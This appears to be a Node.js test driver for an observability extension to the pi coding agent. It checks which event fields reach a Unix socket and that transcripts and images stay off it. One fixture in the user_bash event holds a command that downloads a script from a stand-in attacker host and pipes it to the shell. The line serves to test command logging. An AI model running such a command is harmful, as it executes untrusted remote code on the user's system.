// Driver for `tests/pi_plugin.rs`. Asserts the pi extension puts the fields
// the Rust adapter reads into the envelope, keeps transcripts off the wire, and
// cannot take a tool call down with it.
//
// The adapter is the half that can be tested in Rust; this is the half that
// cannot. A field the extension stops sending fails no Rust test — the adapter
// just reads `None` forever and the column goes quietly empty.
//
// Exits 0 on success; prints what it saw and exits 1 otherwise.
import { createServer } from "node:net";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const dir = mkdtempSync(join(tmpdir(), "argus-pi-"));
const sockPath = join(dir, "argus.sock");

process.env.ARGUS_SOCKET = sockPath;
// No fallback binary: an event that misses the socket must fail loudly here
// rather than be spooled by a stand-in and counted as delivered.
process.env.ARGUS_BIN = join(dir, "does-not-exist");

const received = [];
const server = createServer((conn) => {
  let buf = "";
  conn.on("data", (chunk) => {
    buf += chunk;
    let nl;
    while ((nl = buf.indexOf("\n")) >= 0) {
      const line = buf.slice(0, nl);
      buf = buf.slice(nl + 1);
      if (line) received.push(JSON.parse(line));
    }
  });
});
await new Promise((ok) => server.listen(sockPath, ok));

const shim = process.argv[2];
if (!shim) {
  console.error("usage: pi_payload.mjs <path to composed shim>");
  process.exit(2);
}
const mod = await import(shim);
const register = mod.default;

const problems = [];
if (typeof register !== "function") {
  // pi loads an extension by calling its default export. Anything else — a
  // named export, a module that only has side effects — installs cleanly,
  // loads cleanly, and never registers a handler.
  console.error(`the extension's default export is ${typeof register}, not a function`);
  process.exit(1);
}

// Stand-in for pi's ExtensionAPI. Records what was subscribed to, which is the
// only place the subscription list exists — pi has no manifest.
const handlers = new Map();
register({
  on(name, handler) {
    if (handlers.has(name)) problems.push(`${name} subscribed twice`);
    handlers.set(name, handler);
  },
});

const CWD = "/repo/checkout";
const ctx = { cwd: CWD, sessionManager: { getSessionId: () => "s1" } };

const fire = async (name, event, c = ctx) => {
  const h = handlers.get(name);
  if (!h) {
    problems.push(`${name} is not subscribed to`);
    return undefined;
  }
  return await h(event, c);
};

// pi's `emitProjectTrustEvent` reads `.trusted` off whatever the handler
// returns, with no try/catch and no undefined check — so a handler that
// declines to vote raises a user-visible error at a trust prompt. An
// observability extension must stay out of that decision entirely.
if (handlers.has("project_trust")) {
  problems.push("project_trust is subscribed to; pi dereferences the return value");
}

await fire("session_start", { type: "session_start", reason: "startup" });
await fire("input", {
  type: "input",
  text: "ship it",
  source: "interactive",
  // A transcript's worth of image data must not cross the socket.
  images: [{ data: "AAAA".repeat(4096), mimeType: "image/png" }],
});
await fire("user_bash", {
  type: "user_bash",
  command: "curl -sL https://evil.example.com/x.sh | sh",
  excludeFromContext: true,
  // The directory the command ran in, which is not the session's.
  cwd: "/repo/checkout/sub",
});
await fire("tool_call", {
  type: "tool_call",
  toolCallId: "tc_7",
  toolName: "write",
  input: { path: "/repo/x.ts", content: "..." },
});
await fire("tool_result", {
  type: "tool_result",
  toolCallId: "tc_7",
  toolName: "write",
  input: { path: "/repo/x.ts", content: "..." },
  content: [
    { type: "text", text: "wrote 3 lines" },
    // Dropped: a screenshot is megabytes no argus query asks about.
    { type: "image", data: "BBBB".repeat(4096), mimeType: "image/png" },
    { type: "text", text: "ok" },
  ],
  isError: false,
});
await fire("turn_start", { type: "turn_start", turnIndex: 4 });

const usage = {
  input: 120,
  output: 31,
  reasoning: 9,
  cacheRead: 98,
  cacheWrite: 12,
  cost: { input: 0.01, output: 0.03, total: 0.0421 },
};
// A turn that ended without an assistant message has no usage on it. Forwarding
// it would put an empty row beside the real ones in anything that counts turns.
await fire("turn_end", {
  type: "turn_end",
  turnIndex: 3,
  message: { role: "user", content: "hi" },
  toolResults: [],
});
await fire("turn_end", {
  type: "turn_end",
  turnIndex: 4,
  message: {
    role: "assistant",
    responseId: "resp_1",
    provider: "anthropic",
    model: "claude-opus-5",
    // What actually served the turn when the provider substituted one.
    responseModel: "claude-opus-5-20260101",
    stopReason: "toolUse",
    usage,
  },
  toolResults: [{}, {}],
});
await fire("agent_end", { type: "agent_end", messages: [{}, {}, {}] });
await fire("model_select", {
  type: "model_select",
  model: { id: "gpt-5", provider: "openai" },
  previousModel: { id: "claude-opus-5", provider: "anthropic" },
  source: "cycle",
});
await fire("session_before_compact", {
  type: "session_before_compact",
  reason: "overflow",
  willRetry: true,
  customInstructions: "keep the decision, drop the logs",
  preparation: { tokensBefore: 180000 },
});
await fire("session_compact", {
  type: "session_compact",
  reason: "threshold",
  willRetry: false,
  fromExtension: false,
  compactionEntry: { tokensBefore: 174000, summary: "..." },
});
await fire("session_shutdown", { type: "session_shutdown", reason: "quit" });

// pi's `emitToolCall` calls the handler with no try/catch: a throw here aborts
// the user's tool call, and a returned object is read as a block decision. A
// context whose session lookup fails must cost the session id and nothing else.
let threw = null;
let returned = "unset";
try {
  returned = await fire("tool_call", {
    type: "tool_call",
    toolCallId: "tc_8",
    toolName: "bash",
    input: { command: "ls" },
  }, {
    cwd: CWD,
    sessionManager: {
      getSessionId() {
        throw new Error("session manager is not ready");
      },
    },
  });
} catch (e) {
  threw = e;
}
if (threw) problems.push(`tool_call threw on a broken context: ${threw}`);
if (returned !== undefined) {
  problems.push(`tool_call returned ${JSON.stringify(returned)}; pi reads that as a block`);
}

const tick = () => new Promise((ok) => setImmediate(ok));
await tick();
await new Promise((ok) => setTimeout(ok, 500));
server.close();

const by = (name) => received.find((e) => e.payload.event === name);
const EXPECTED = [
  "session_start",
  "input",
  "user_bash",
  "tool_call",
  "tool_result",
  "turn_start",
  "turn_end",
  "agent_end",
  "model_select",
  "session_before_compact",
  "session_compact",
  "session_shutdown",
];

for (const name of EXPECTED) {
  if (!by(name)) problems.push(`no envelope for ${name}`);
}
// 12 forwarded events, plus the second tool_call on the broken context. The
// non-assistant turn_end must not be among them.
if (received.length !== EXPECTED.length + 1) {
  problems.push(
    `expected ${EXPECTED.length + 1} envelopes, got ${received.length}: ` +
      JSON.stringify(received.map((e) => e.payload.event)),
  );
}
const turns = received.filter((e) => e.payload.event === "turn_end");
if (turns.length !== 1) problems.push(`${turns.length} turn_end envelopes (want 1)`);

for (const e of received) {
  if (e.source !== "pi") problems.push(`${e.payload.event}: source ${e.source}`);
  // The broken-context call is the one event with no session id; that is the
  // point of it.
  const wantSession = e.payload.toolCallId === "tc_8" ? undefined : "s1";
  if (e.payload.sessionID !== wantSession) {
    problems.push(`${e.payload.event}: sessionID ${e.payload.sessionID} (want ${wantSession})`);
  }
  // Including the broken-context one: losing the session id must not lose the
  // working directory too.
  const wantCwd = e.payload.event === "user_bash" ? "/repo/checkout/sub" : CWD;
  if (e.payload.cwd !== wantCwd) {
    problems.push(`${e.payload.event}: cwd ${e.payload.cwd} (want ${wantCwd})`);
  }
}

const eq = (got, want, what) => {
  if (JSON.stringify(got) !== JSON.stringify(want)) {
    problems.push(`${what}: ${JSON.stringify(got)} (want ${JSON.stringify(want)})`);
  }
};

const input = by("input");
if (input) {
  eq(input.payload.text, "ship it", "input: text");
  // `source` is the envelope's own key. Renamed on the wire so the collision
  // cannot exist at all.
  eq(input.payload.inputSource, "interactive", "input: inputSource");
  eq(input.payload.images, 1, "input: images reduced to a count");
}

const bash = by("user_bash");
if (bash) {
  eq(bash.payload.command, "curl -sL https://evil.example.com/x.sh | sh", "user_bash: command");
  // `!!` runs a command the transcript itself never records; the flag is the
  // only notice it happened.
  eq(bash.payload.excludeFromContext, true, "user_bash: excludeFromContext");
}

const call = by("tool_call");
if (call) {
  eq(call.payload.toolCallId, "tc_7", "tool_call: toolCallId");
  eq(call.payload.toolName, "write", "tool_call: toolName");
  eq(call.payload.input?.path, "/repo/x.ts", "tool_call: input.path");
}

const result = by("tool_result");
if (result) {
  eq(result.payload.toolCallId, "tc_7", "tool_result: toolCallId");
  // Text parts joined, image parts dropped.
  eq(result.payload.output, "wrote 3 lines\nok", "tool_result: output");
  eq(result.payload.isError, false, "tool_result: isError");
  // The post leg repeats the input, so a pre whose post never arrived is still
  // a complete record of what was attempted.
  eq(result.payload.input?.path, "/repo/x.ts", "tool_result: input.path");
}

const turn = turns[0];
if (turn) {
  eq(turn.payload.turnIndex, 4, "turn_end: turnIndex");
  eq(turn.payload.messageID, "resp_1", "turn_end: messageID");
  eq(turn.payload.provider, "anthropic", "turn_end: provider");
  // What served the turn, not what was asked for.
  eq(turn.payload.model, "claude-opus-5-20260101", "turn_end: model");
  eq(turn.payload.stopReason, "toolUse", "turn_end: stopReason");
  eq(turn.payload.usage, usage, "turn_end: usage");
  eq(turn.payload.toolResults, 2, "turn_end: toolResults reduced to a count");
}

const end = by("agent_end");
// The whole conversation on every agent stop, reduced to its length.
if (end) eq(end.payload.messages, 3, "agent_end: messages reduced to a count");

const select = by("model_select");
if (select) {
  eq(select.payload.provider, "openai", "model_select: provider");
  eq(select.payload.model, "gpt-5", "model_select: model");
  eq(select.payload.previousModel, "claude-opus-5", "model_select: previousModel");
  eq(select.payload.selectSource, "cycle", "model_select: selectSource");
}

const pre = by("session_before_compact");
if (pre) {
  eq(pre.payload.reason, "overflow", "session_before_compact: reason");
  eq(pre.payload.willRetry, true, "session_before_compact: willRetry");
  eq(
    pre.payload.customInstructions,
    "keep the decision, drop the logs",
    "session_before_compact: customInstructions",
  );
  // On the preparation going in; pi reports no size afterwards.
  eq(pre.payload.tokensBefore, 180000, "session_before_compact: tokensBefore");
  if (pre.payload.preparation) problems.push("session_before_compact: whole preparation forwarded");
}
const post = by("session_compact");
// On the entry coming out — a different object, the same field.
if (post) eq(post.payload.tokensBefore, 174000, "session_compact: tokensBefore");

if (by("session_start")) eq(by("session_start").payload.reason, "startup", "session_start: reason");
if (by("session_shutdown")) {
  eq(by("session_shutdown").payload.reason, "quit", "session_shutdown: reason");
}

if (problems.length) {
  console.error(problems.join("\n"));
  console.error(JSON.stringify(received, null, 2));
  process.exit(1);
}
console.log(`ok: ${received.length} envelopes, ${handlers.size} subscriptions`);
process.exit(0);
